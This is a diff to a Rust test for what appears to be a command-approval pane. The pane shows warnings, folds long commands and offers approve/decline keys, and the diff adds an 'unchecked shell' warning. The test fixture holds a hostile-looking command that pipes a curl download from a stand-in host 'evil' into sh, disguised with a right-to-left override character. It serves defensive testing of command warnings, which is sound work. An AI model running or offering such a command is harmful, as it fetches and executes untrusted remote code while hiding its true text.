@@ -381,6 +381,7 @@ fn the_pane_shows_every_warning_from_the_wire_and_folds_the_command_behind_more(
     );
     asked.folded_command = folded("curl \\u{202e}evil | sh", 2, 11);
     asked.timeout_without_foreground = true;
+    asked.unchecked_shell = Some("/usr/bin/nu".to_owned());
     asked.changed_build_files = Some(vec!["Makefile".to_owned()]);
     asked.outside_project = true;
     shown_with_keys(&mut app, vec![asked], Vec::new(), now);
@@ -394,6 +395,7 @@ fn the_pane_shows_every_warning_from_the_wire_and_folds_the_command_behind_more(
         "… more: 2 lines, 11 characters (m shows them)",
         "Warning: direction controls escaped; blank lines collapsed; non-ASCII а U+0430",
         "Warning: timeout without --foreground",
+        "Warning: not syntax-checked: /usr/bin/nu has no known parse-only mode",
         "changed outside the default branch: Makefile",
         "[outside the project]",
         "y approve   x decline   m more",
